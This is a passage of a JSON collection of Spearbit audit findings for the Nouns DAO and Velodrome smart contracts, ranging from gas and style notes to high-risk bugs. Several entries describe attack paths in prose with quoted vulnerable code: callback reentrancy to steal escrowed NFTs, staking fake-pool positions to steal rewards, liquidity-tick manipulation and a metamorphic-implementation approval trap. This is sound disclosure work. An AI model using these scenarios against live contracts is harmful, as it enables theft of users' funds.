        "body": "String errors are added to the bytecode which make deployment cost more expenseive. It is also difficult to use dynamic information in them. Custom errors are more convenient and gas-efficient. There are several cases across the codebase where long string errors are still used over custom errors. As an example, in NounsDAOLogicV1Fork.sol#L680, the check reverts with a string: require(msg.sender == admin, 'NounsDAO::_setQuorumVotesBPS: admin only'); In this case, the AdminOnly() custom error can be used here to save gas. This also occur in other parts of this contract as well as the codebase. Also, some custom errors were defined but not used. See NounTokenFork.sol#L40, NounTokenFork.sol#L43",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "escrowedTokensByForkId can be used to get owner of escrowed tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The state variable escrowedTokensByForkId in L58 creates a getter function that can be used to check the owner of escrowed token. This performs the same function as calling ownerOfEscrowedToken() and might be considered redundant.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Emit events using locally assigned variables instead of reading from storage to save on SLOAD",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "By emitting local variables over storage variables, when they have the same value, you can save gas on SLOAD. Some examples include: NounsDAOLogicV1Fork.sol#L619 : - + emit VotingDelaySet(oldVotingDelay, votingDelay); emit VotingDelaySet(oldVotingDelay, newVotingDelay); NounsDAOLogicV1Fork.sol#L635 : - + emit VotingPeriodSet(oldVotingPeriod, votingPeriod); emit VotingPeriodSet(oldVotingPeriod, newVotingPeriod); NounsDAOLogicV1Fork.sol#L653 : - + emit ProposalThresholdBPSSet(oldProposalThresholdBPS, proposalThresholdBPS); emit ProposalThresholdBPSSet(oldProposalThresholdBPS, newProposalThresholdBPS); NounsDAOLogicV1Fork.sol#L670 : - emit QuorumVotesBPSSet(oldQuorumVotesBPS, quorumVotesBPS); + emit QuorumVotesBPSSet(oldQuorumVotesBPS, newQuorumVotesBPS); NounsDAOExecutorV2.sol#L104 : - + emit NewDelay(delay); emit NewDelay(delay_); NounsDAOExecutorV2.sol#L112 : - + emit NewAdmin(admin); emit NewAdmin(msg.sender); NounsDAOExecutorV2.sol#L122 : - + emit NewPendingAdmin(pendingAdmin); emit NewPendingAdmin(pendingAdmin_); NounsDAOV3Admin.sol#L284 : - + emit NewPendingAdmin(oldPendingAdmin, ds.pendingAdmin); emit NewPendingAdmin(oldPendingAdmin, address(0)); NounsDAOProxy.sol#L85 : - + emit NewImplementation(oldImplementation, implementation); emit NewImplementation(oldImplementation, implementation_);",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "joinFork() violates Checks-Effects-Interactions best practice for reentrancy mitigation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "joinFork() interacts with forkDAOTreasury in sendProRataTreasury() to send pro rata original DAO treasury for the tokens joining the fork. This interaction with the external forkDAOTreasury contract happens before the transfer of the original DAO tokens to the timelock is effected. While forkDAOTreasury is under the control of the fork DAO (outside the trust model of original DAO) and join- Fork() does not have a reentrancy guard, we do not see a potential/meaningful exploitable reentrancy here.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename MAX_VOTING_PERIOD and MAX_VOTING_DELAY to enhance readability.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Given that the state variables MAX_VOTING_PERIOD (NounsDAOV3Admin.sol#L115) and MAX_VOT- ING_DELAY (NounsDAOV3Admin.sol#L121) are in blocks, it is more readable if the name has a _BLOCKS suffix and is set to 2 weeks / 12 as done with MAX_OBJECTION_PERIOD_BLOCKS and MAX_UPDATABLE_PERIOD_BLOCKS. The functions, _setVotingDelay (L152) and _setVotingPeriod (L167), can be renamed in the same vain by adding -InBlocks suffix similar to _setObjectionPeriodDurationInBlocks and other functions. In addition to this, constants should be named with all capital letters with underscores separating words, follow- ing the Solidity style guide. For example, proposalMaxOperations in NounsDAOV3Proposals.sol#L138 can be renamed.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "External function is used instead of internal equivalent across NounsDAOV3Proposals logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Public view state(ds, proposalId) is used instead of the fully equivalent internal stateInter- nal(ds, proposalId) in the several occurrences of NounsDAOV3Proposals logic. For example, in the NounsDAOV3Proposals:updateProposalBySigs the state(ds, proposalId) is used instead of the stateInternal function: if (state(ds, proposalId) != NounsDAOStorageV3.ProposalState.Updatable) revert ,! CanOnlyEditUpdatableProposals(); 49",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Proposals created through proposeBySigs() can not be executed on TimelockV1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Currently, proposals created through the proposeBySigs() function can not be executed on Time- lockV1. This could potentially limit the flexibility of creating different types of proposals. It may be advantageous to have a parameter added to the proposeBySigs() function, allowing the proposer to decide whether the proposal should be executed on TimelockV1 or not. There's a design decision to be made regarding whether this value should be incorporated as part of the signers' signature, or simply left up to the proposer to determine if execution should happen on the TimelockV1 or not.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "escrowToFork() can be frontrun to prevent users from joining the fork during the escrow period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "escrowToFork() could be frontrun by another user and make it revert by either: 1. Frontrunning with another escrowToFork() that reaches the fork threshold + executeFork(). 2. If the fork threshold was already reached, frontrunning with executeFork(). This forces the escrowing user to join the fork only during the forking period.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fork spec says Nouns are escrowed during the fork active period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Fork-Spec says: \"During the forking period additional forking Nouns are also sent to the escrow contract; the motivation is to have a clean separation between fork-related Nouns and Nouns owned by the DAO for other reasons.\" However, the implementation sends such Nouns to the original DAO treasury.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Known issues from previous versions/audit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Below are some of the known issues from previous versions as reported by the protocol team, documented in the audit report and is being recorded here verbatim for reporting purposes. Note: All issues reported earlier and not fixed in current version(s) of audit scope are assumed to be acknowledged without fixing. NounsToken delegateBySigs allows delegating to address zero Weve fixed this issue in the fork token contract, but cannot fix it in the original NounsToken because the contract isnt upgradeable. Voting gas refund can be abused Were aware of different ways of abusing this function: A token holder could delegate their Nouns to a contract and vote on multiple proposals in a loop, such that the tx gas overhead is amortized across all votes, while the refund function assumes each vote has the full overhead to bear; this could result in token holders profiting from gas refunds. A token holder could grief the DAO by voting with very long reason strings, in order to drain the refund balance faster. We find these issues low risk and unlikely given the small size of the community, and the low ETH balance the governor contract has to spend on refunds. Should we see such abusive activity, we might reconsider this feature. Nouns transfers will stop working when block number hits uint32 max value Were aware of this issue. It means the Nouns token will stop functioning a long long long time from now :) AuctionHouse has an open gas griefing vector Bidder Alice can bid from a smart contract that returns a large byte array when receiving ETH. Then if Bob outbids Alice, in his bid tx AuctionHouse refunds Alice, and the large return value causes a gas cost spike for Bob. See more details here. Were planning to fix this in the next AuctionHouse version, its launch date is unknown at this point. Using error strings instea of custom errors In all new code were using custom errors. In code thats forked from previous versions we optimized for the smallest diff possible, and so leaving error strings untouched.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "When a minority forks, the majority can follow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "This is a known issue as documented by the protocol team and is being recorded here verbatim for reporting purposes. For example, a malicious majority can vote For a proposal to drain the treasury, forcing others to fork; the majority can then join the fork with many of their tokens, benefiting from the passing proposal on the original DAO, while continuing to attack the minority in their new fork DAO, forcing them to quit the fork DAO. This is a well known flaw of the current fork design, something weve chosen to go live with for the sake of shipping something the DAO has asked for urgently.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "The original DAO can temporarily brick a fork DAOs token minting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "This is a known issue as documented by the protocol team and is being recorded here verbatim for reporting purposes. Weve decided in this version to deploy fork DAOs such that fork tokens reuse the same descriptor contract as the original DAOs token descriptor. Our motivations are minimizing lines of code and the gas cost of deploying a fork. This design poses a risk on fork tokens: the original DAO can update the descriptor to use a new art contract that always reverts, which would then lead to fork tokens mint function always reverting. The solution would be for the fork DAO to execute a proposal that deploys and sets a new descriptor to its token, which would use a valid art contract, allowing minting to resume. The fork DAO is guaranteed to be able to propose and execute such a proposal, because the function where Nouners claim their fork tokens does not use the descriptor, and so is not vulnerable to this attack.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused events, missing events and unindexed event parameters in contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Some contracts have missing or unused events, as well as event parameters that are unindexed. As an examples: 1. Unused events: INounsTokenFork.sol#L29: event NoundersDAOUpdated(address noundersDAO); 2. Missing events: NounsDAOV3Admin.sol#L509-514: Missing event like in _setForkEscrow 3. Unindexed parameters: NounsDAOEventsFork.sol: Many parameters can be indexed here",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prefer using __Ownable_init instead of _transferOwnership to initialize upgradable contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The upgradable NounsAuctionHouseFork and the NounsTokenFork contracts inherit the OwnableUp- gradeable contract. However, inside the initialize function the ownership transfer is performed by calling the internal _transferOwnership function instead of calling the __Ownable_init. This deviates from the standard ap- proach of initializing upgradable contracts, and it can lead to issues if the OwnableUpgradeable contract changes its initialization mechanism.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider emitting the address of the timelock in the ProposalQueued event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The queue function currently emits the ProposalQueued event to provide relevant information about the proposal, including the proposalId and the eta. However, it doesn't emit the timelock variable, which rep- resents the address of the timelock responsible for executing the proposal. This could lead to confusion among users regarding the intended timelock for proposal execution.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use IERC20Upgradeable/IERC721Upgradeable for consistency with other contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Most contracts/libraries imported and used are the upgradeable variant e.g. OwnableUpgradeable. IERC20 and IERC721 are used which is inconsistent with the other contracts/libraries. Since the project is deployed with upgradeability featured, it is more preferable to use the Upgradeable variant of OpenZeppelin Contracts.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Specification says \"Pending\" state instead of \"Updatable\"",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The V3 spec says the following for \"Proposal editing\": \"The proposer account of a proposal in the PENDING state can call an updateProposal function, providing the new complete set of transactions to execute, as well as a complete new version of the proposal description text.\" This is incorrect because editing can only happen in the \"Updatable\" state which is just before the \"Pending\" state.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos, comments and descriptions need to be updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "comments/descriptions. The contract Typos: source code contains several typographical errors and misaligned 1. NounsDAOLogicV1Fork.sol#L48: adjutedTotalSupply should be adjustedTotalSupply 2. NounsDAOLogicV1Fork.sol#L80: veteor shoud be vetoer 3. NounsDAOV3Votes.sol#L267: objetion should be objection 4. NounsDAOExecutorProxy.sol#L24: imlemenation should be implementation Comment Discrepancies: 1. NounsDAOV3Admin.sol#L130: Should say // 6,000 basis points or 60% and not 4,000 2. NounsDAOV3Votes.sol#L219: change string 'NounsDAO::castVoteInternal: voter already voted' to 'NounsDAO::castVoteDuringVotingPeriodInternal: voter already voted' 54 3. NounsDAOExecutorV2.sol#L209: change string 'NounsDAOExecutor::executeTransaction: Call must come from admin. to 'NounsDAOExecutor::sendETH: Call must come from admin. 4. NounsDAOExecutorV2.sol#L221: change string NounsDAOExecutor::executeTransaction: Call must come from admin. to NounsDAOExecutor::sendERC20: Call must come from admin. 5. NounsDAOV3DynamicQuorum.sol#L124: Should be adjusted total supply 6. NounsDAOV3DynamicQuorum.sol#L135: Should be adjusted total supply 7. NounsDAOLogicV3.sol#L902: Adjusted supply is used for minQuorumVotes() 8. NounsDAOLogicV3.sol#L909: Adjusted supply is used for maxQuorumVotes() 9. NounsDAOStorageV1Fork.sol#L33: proposalThresholdBPS is required to be exceeded, say when it is zero, one noun is needed to propose 10. NounsTokenFork.sol#L66: Typo, to be after which",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Contracts are not using the _disableInitializers function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Several Nouns-Dao contracts utilize the Initializable module provided by OpenZeppelin. To ensure that an implementation contract is not left uninitialized, it is recommended in OpenZeppelin's documentation to include the _disableInitializers function in the constructor. The _disableInitializers function automatically locks the contracts upon deployment. According to the OpenZeppelin documentation: Do not leave an implementation contract uninitialized. An uninitialized implementation contract can be taken over by an attacker, which may impact the proxy. To prevent the implementation contract from being used, you should invoke the _disableInitializers function in the constructor to automatically lock it when it is deployed:",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing or incomplete Natspec documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "There are several instances throughout the codebase where NatSpec is either missing or incomplete. 1. Missing Natspec (Some functions in this case are missing Natspec comment):  NounsDAOV3Fork.sol#L203  NounsDAOV3Votes.sol#L295  NounsDAOV3Admin.sol  NounsDAOV3Proposals.sol  NounsDAOExecutor.sol  NounsDAOExecutorV2.sol 2. Incomplete Natspec (Some functions are missing @param tag):  NounsTokenFork.sol  NounsDAOV3Admin.sol  NounsDAOV3Proposals.sol  NounsDAOLogicV3.sol",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function ordering does not follow the Solidity style guide",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The recommended order of functions in Solidity, as outlined in the Solidity style guide, is as follows: constructor(), receive(), fallback(), external, public, internal and private. However, this ordering isn't enforced in the across the Nouns-Dao codebase.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use a more recent Solidity version",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The compiler version used 0.8.6 is quite old (current version is 0.8.20). This version was released almost two years ago and there have been five applicable bug fixes to this version since then. While it seems that those bugs don't apply to the Nouns-Dao codebase, it is advised to update the compiler to a newer version.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational ERC721CheckpointableUpgradeable.sol#L46, NounsDAOExecutorV2.sol#L40, NounsDAOLog-"
        ]
    },
    {
        "title": "State modifications after external sToOwner prone to reentrancy attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "External NFT call happens before numTokensInEscrow update in returnTokensToOwner(). This looks safe (NFT is fixed to be noun contract and transferFrom() is used instead of the safe version, and also numTokensInEscrow = 0 in closeEscrow() acts as a control for numTokensInEscrow -= tokenIds.length logic), but in general this type of execution flow structuring could allow for direct stealing via reentrancy. I.e. in a presence of callback (e.g. arbitrary NFT instead of noun contract or safeTransferFrom instead of trans- ferFrom) and without numTokensInEscrow = 0 conflicting with numTokensInEscrow -= tokenIds.length, as an abstract example, an attacker would add the last needed noun for forking, then call withdrawFromForkEscrow() and then, being in returnTokensToOwner(), call executeFork() from the callback hook, successfully performing the fork, while already withdrawn the NFT that belongs to DAO.  NounsDAOForkEscrow.sol#L110-L125) function returnTokensToOwner(address owner, uint256[] calldata tokenIds) external onlyDAO { for (uint256 i = 0; i < tokenIds.length; i++) { if (currentOwnerOf(tokenIds[i]) != owner) revert NotOwner(); >> nounsToken.transferFrom(address(this), owner, tokenIds[i]); escrowedTokensByForkId[forkId][tokenIds[i]] = address(0); } numTokensInEscrow -= tokenIds.length; }  NounsDAOV3Fork.sol#L109-L130 57 function executeFork(NounsDAOStorageV3.StorageV3 storage ds) external returns (address forkTreasury, address forkToken) { if (isForkPeriodActive(ds)) revert ForkPeriodActive(); INounsDAOForkEscrow forkEscrow = ds.forkEscrow; >> uint256 tokensInEscrow = forkEscrow.numTokensInEscrow(); if (tokensInEscrow <= forkThreshold(ds)) revert ForkThresholdNotMet(); uint256 forkEndTimestamp = block.timestamp + ds.forkPeriod; (forkTreasury, forkToken) = ds.forkDAODeployer.deployForkDAO(forkEndTimestamp, forkEscrow); sendProRataTreasury(ds, forkTreasury, tokensInEscrow, adjustedTotalSupply(ds)); uint32 forkId = forkEscrow.closeEscrow(); ds.forkDAOTreasury = forkTreasury; ds.forkDAOToken = forkToken; ds.forkEndTimestamp = forkEndTimestamp; emit ExecuteFork(forkId, forkTreasury, forkToken, forkEndTimestamp, tokensInEscrow); } Direct stealing as a result of state manipulations is possible conditional on an ability to enter a callback. Given the absense of the latter at the moment, but critical impact of the former, considering this as best practice recommen- dation and setting the severity to be informational.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational interactions make NounsDAOForkEscrow's returnToken-"
        ]
    },
    {
        "title": "No need to use an assembly block to get the chain ID",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Currently the getChainId() uses an assembly block to get the current chain ID when constructing the domain separator. This is not needed since there is a global variable for this already.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "Naming convention for interfaces is not always always followed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The NounsTokenForkLike interface does not follow the standard naming convention for Solidity interfaces, which begins with an I prefix. This inconsistency can make it harder for developers to understand the purpose and usage of the contract.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Informational"
        ]
    },
    {
        "title": "CLGauge stakers can earn more than their due, with claimable rewards exceeding available rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "Staking users are intended to earn rewards submitted during an epoch. In case there was no staking, the rewards should be rolled over, and available to stakers in the next epoch where rewards are added. This is currently handled in the code. However, in addition to the rollover, the current logic in CLPool._updateRe- wardsGrowthGlobal and CLGauge._earned can also retroactively apply rewards from prior epochs, with ideal sce- narios resulting in a doubling of claimable rewards from prior periods. This can occur from both malicious and benign actors. In case of a single party as a staker, they may be unable to withdraw their rewards, as their rewards would exceed the balance. A malicious actor may be able to withdraw the entire reward balance much earlier than they should, and then leave the Gauge in a perpetual overdrawn state thereafter. In case of multiple stakers, it would essentially be a race on emptying the rewards, with a number of stakers left with no rewards and no way to withdraw.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "SwapRouter doesn't refund unspent ETH after swapping",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "SwapRouter allows swapping of ETH for ERC20 tokens. The difference between selling ETH and an ERC20 token is that the contract can compute and request from the user the exact amount of ERC20 tokens to sell, but, when selling ETH, the user has to send the entire amount when making the call (i.e. before the actual amount was computed in the contract). As swaps made via SwapRouter can be partial, there are scenarios when ETH can be spent partially. However, the contract doesn't refund unspent ETH in such scenarios: 1. When sqrtPriceLimitX96 is set (SwapRouter.sol#L80, SwapRouter.sol#L164), the swap will be interrupted when the limit price is reached, and some ETH can be left unspent. 2. A swap can be interrupted earlier when there's not enough liquidity in a pool. 3. Positive slippage can result in more efficient swaps, causing exact output swaps to leave some ETH unspent (even when it was pre-computed precisely by the caller). As a result, SwapRouter can hold some leftover ETH after a swap was made. This ETH can be withdrawn by anyone via the SwapRouter.refundETH() function, causing a loss to the SwapRouter user.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Undistributed rewards are not rolled over when additional rewards are announced in an epoch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "CLGauge._notifyRewardAmount() allows notifying rewards multiple times in an epoch. However, undistributed rewards are not rolled over during additional reward notifications: 1. When notifying rewards for the first using CLPool.timeNoStakedLiquidity() and rolled over (CLGauge.sol#L333-L343): time in an epoch, undistributed rewards are computed the epoch to the remaining time of // rolling over stuck rewards from previous epoch (if any) uint256 tnsl = pool.timeNoStakedLiquidity(); // we must only count tnsl for the previous epoch if (tnsl + timeUntilNext > DURATION) { tnsl -= (DURATION - timeUntilNext); // subtract time in current epoch // skip epochs where no notify occurred, but account for case where no rewards // distributed over one full epoch (unlikely) if (tnsl != DURATION) tnsl %= DURATION; } _amount += tnsl * rewardRate; rewardRate = _amount / timeUntilNext; 2. When notifying additional rewards in an epoch, undistributed rewards are not computed and not rolled over (CLGauge.sol#L346-L349): uint256 _remaining = periodFinish - timestamp; uint256 _leftover = _remaining * rewardRate; IERC20(rewardToken).safeTransferFrom(_sender, address(this), _amount); rewardRate = (_amount + _leftover) / timeUntilNext; 6 The two branches then call CLPool.syncReward() (CLGauge.sol#L344, CLGauge.sol#L350), which resets the value of timeNoStakedLiquidity (CLPool.sol#L891). Since the second branch doesn't roll over the undistributed rewards (which are computed using the value of CLPool.timeNoStakedLiquidity), they'll remain locked in the contract. Due to the way rewards are notified (new rewards are always added to the remaining ones), these rewards cannot be unlocked by new notifications.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Reward notification can unnecessarily reduce tnsl, causing locking of rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "The CLPool.timeNoStakedLiquidity variable tracks the duration when there was a reward in a pool but no staked liquidity. The variable can be updated in epochs following the one it's supposed to track, thus CLGauge._notifyRewardAmount() needs to reduce its value to find the actual period of no staked liquidity in the previous epoch: uint256 timeUntilNext = VelodromeTimeLibrary.epochNext(timestamp) - timestamp; // ... // we must only count tnsl for the previous epoch if (tnsl + timeUntilNext > DURATION) { tnsl -= (DURATION - timeUntilNext); // subtract time in current epoch // ... However, it incorrectly detects the length of timeNoStakedLiquidity outside of its epoch: in the snipped above, the remaining time of the current epoch is added to tnsl; instead, the passed time in the current epoch should be added. As a result, tnsl will be mistakenly reduced when it shouldn't. Since tnsl is used to compute the amount of rewards to roll over from the previous epoch (CLGauge.sol#L342), a mistakenly reduced tnsl will reduce the amount of rewards that will be rolled over. Because of the way rewards notification works (new rewards are always added to the current ones), the amount of rewards that wasn't rolled over due to the unnecessary reduction will remain locked in the contract.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "CLGauge.deposit() doesn't verify that the liquidity to stake is from the pool the gauge integrates with",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "CLGauge.deposit() allows to stake an NFT that provides liquidity to a different pool (i.e. a pool the gauge doesn't integrate with). This allows a malicious actor to stake liquidity into a CLGauge from a fake CLPool and earn gauge rewards, stealing them from the liquidity providers of the gauge's pool.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Liquidity staked at ticks can be manipulated to impact swap fees and rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "When removing all staked liquidity from a position via CLGauge.decreaseStakedLiquidity(), the amounts of staked liquidity at the ticks of the position are recorded incorrectly: due to the clearing of the ticks, the lower tick will have the negative amount of staked liquidity and the upper tick will have the positive amount. In a normal situation, both values should be 0. calls to remove liquidity from the position. NonfungiblePositionManager.decreaseLiquidity() CLGauge.decreaseStakedLiquidity() The latter calls CLPool.burn() (Nonfungi- (CLGauge.sol#L270) Burning liquidity updates a position blePositionManager.sol#L296) (CLPool.sol#L497-L504, CLPool.sol#L260), which clears the ticks if all liquidity was removed from the position (CLPool.sol#L367-L375). This clearing will also clear the values of stakedLiquidityNet of the ticks. However, CLGauge.decreaseStakedLiquidity() then calls CLPool.stake() (CLGauge.sol#L280), which updates the staked liquidity in the ticks that have just been cleared (CLPool.sol#L544-L545). to burn the liquidity from the pool. As a result, the total amount of staked liquidity in a pool can be skewed during swapping as pool's staked liquidity is updated with the values stored at ticks (CLPool.sol#L726). This will have a strong impact on the protocol since both swap fees (CLPool.sol#L684-L685) and gauge rewards (CLPool.sol#L870) are computed based on the amount of staked liquidity. While the impact can be caused by any user who removes their liquidity via CLGauge.decreaseStakedLiquidity(), we also believe that the miscalculation can be triggered intentionally to manipulate the value of staked liquidity to gain benefits from swap fees and/or gauge rewards.",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: High Risk"
        ]
    },
    {
        "title": "UniswapV2Library.getAmountIn uses hardcoded fees, but Velodrome Pools have custom fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "getAmountIn uses fees to determine the amountIn necessary to receive a given amountOut (see UniswapV2Library.sol#L121-L132): function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut, Route memory route) internal view returns (uint256 amountIn) { } if (reserveIn == 0 || reserveOut == 0) revert InvalidReserves(); if (!route.stable) { amountIn = (amountOut * 1000 * reserveIn) / ((reserveOut - amountOut) * 997) + 1; } else { revert StableExactOutputUnsupported(); } This is cognizant of fees (997), but the fees are hardcoded, which may cause the math to be incorrect, since Pool allows custom fees to be set via the factory (see Pool.sol#L372-L373): if (amount0In > 0) _update0((amount0In * IPoolFactory(factory).getFee(address(this), stable)) / 10000); ,! if (amount1In > 0) _update1((amount1In * IPoolFactory(factory).getFee(address(this), stable)) / 10000); // accrue fees for token0 and move them out of pool",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Implementations of clones could be metamorphic and lead to exploit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
        "body": "CLPool, CLGauge and Pool contracts are deployed utilizing OZ Clones library. It is defined as A library that can deploy cheap minimal non-upgradeable proxies The proxies themselves will always be locked to a specific implementation, and in that sense cannot be upgraded, but the code at the implementation address could change, by what's often referred to as \"metamorphic smart contracts\". This opens a variety of possible options. A full blown metamorphic contract could lead to complete compromise of the contracts via many scenarios. The one saving grace, is that it requires a malicious party in control of the deploy pipeline to execute this (dev). But in the case of such a scenario, one simple but compromising attack would be a 10 metamorphic CLGauge implementation that initially calls nft.setApproveForAll on behalf of a malicious operator, giving approval for any future Pool NFTs it would own. This could be done prior to any actual staking to avoid detection. Once successfully executed across the gauges expected to have highest staking, the implementation could be metamorphised to the non-exploitative contract, missing that functionality (the fact that this contract cannot be exploited doesn't matter, as the exploit has already run and is present on the NFT contract, regardless of implementation's contents). Staking users could audit the current implementation themselves and would not see this possibility in the current code, and assume it is safe. However, any liquidity they stake, could be withdrawn, as the malicious operator would have approval to send the staked NFTs to any address they wish, and subsequently remove their liquidity and tokens from the pool to their own controlled addresses. A simpler risk that could make its way in simply by error would be an implementation that contains the SELFDE- STRUCT opcode or a DELEGATECALL which could lead access to the code. In this case any party could brick all the proxies dependent on the implementation in question, resulting in permanent fund loss, unless CREATE2 was used to deploy the implementation (in which case we return full circle to a metamorphic contract).",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "GovernorSimple and VetoGovernor minimum weight math uses the incorrect divisor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review-Nov23.pdf",
